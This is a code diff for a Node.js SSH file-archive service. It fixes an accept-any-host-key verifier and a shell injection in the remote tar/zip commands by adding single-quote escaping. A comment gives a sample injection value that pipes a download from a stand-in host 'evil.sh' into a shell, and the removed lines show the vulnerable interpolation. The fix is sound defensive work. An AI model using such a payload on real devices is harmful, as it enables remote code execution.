@@ -20,6 +20,7 @@
 const { Client } = require('ssh2');
 const path = require('path');
 const { decrypt } = require('./crypto');
+const { tofuVerifier } = require('./sshHostKeys');
 
 const CONNECT_TIMEOUT = 10000;
 
@@ -74,7 +75,10 @@ function connect(device) {
       port: Number(device.ssh_port) || 22,
       username,
       readyTimeout: CONNECT_TIMEOUT,
-      hostVerifier: () => true, // see services/ssh.js — no known_hosts store in this server process
+      // SECURITY FIX: see services/sshHostKeys.js — was accepting any host
+      // key unconditionally; now pins on first connect and requires a match
+      // on every connection after that.
+      hostVerifier: tofuVerifier(device),
       algorithms: ALGORITHMS,
     };
     if (privateKey) { cfg.privateKey = privateKey; if (password) cfg.passphrase = password; }
@@ -199,10 +203,24 @@ async function statAbs(device, mount, relPath) {
 // tar and gzip are on essentially every Linux box already; zip needs the
 // `zip` package installed, and a missing binary surfaces as a normal error
 // below rather than a silently empty/truncated archive.
+// SECURITY FIX: parentDir/baseName used to be interpolated straight into a
+// double-quoted shell string with no escaping. resolveSafe() blocks '..'
+// traversal but does nothing about shell metacharacters — a sourcePath
+// containing a `"` could close the quoted argument early and inject
+// arbitrary additional commands that would run on the TARGET DEVICE over
+// the SSH connection, e.g. sourcePath = 'foo"; curl evil.sh|sh #'. Single-
+// quote everything instead (the one style of quoting with no special
+// characters inside it other than a single quote itself), and escape any
+// embedded single quote with the standard '\'' trick — the same pattern
+// services/scpPush.js already uses correctly for this exact reason.
+function shellQuote(str) {
+  return `'${String(str).replace(/'/g, `'\\''`)}'`;
+}
+
 const REMOTE_ARCHIVE_COMMANDS = {
-  'tar.gz': (parentDir, baseName) => `tar -czf - -C "${parentDir}" "${baseName}"`,
-  tar:      (parentDir, baseName) => `tar -cf - -C "${parentDir}" "${baseName}"`,
-  zip:      (parentDir, baseName) => `cd "${parentDir}" && zip -qr - "${baseName}"`,
+  'tar.gz': (parentDir, baseName) => `tar -czf - -C ${shellQuote(parentDir)} ${shellQuote(baseName)}`,
+  tar:      (parentDir, baseName) => `tar -cf - -C ${shellQuote(parentDir)} ${shellQuote(baseName)}`,
+  zip:      (parentDir, baseName) => `cd ${shellQuote(parentDir)} && zip -qr - ${shellQuote(baseName)}`,
 };
 
 async function archiveStream(device, mount, relPath, format = 'tar.gz') {
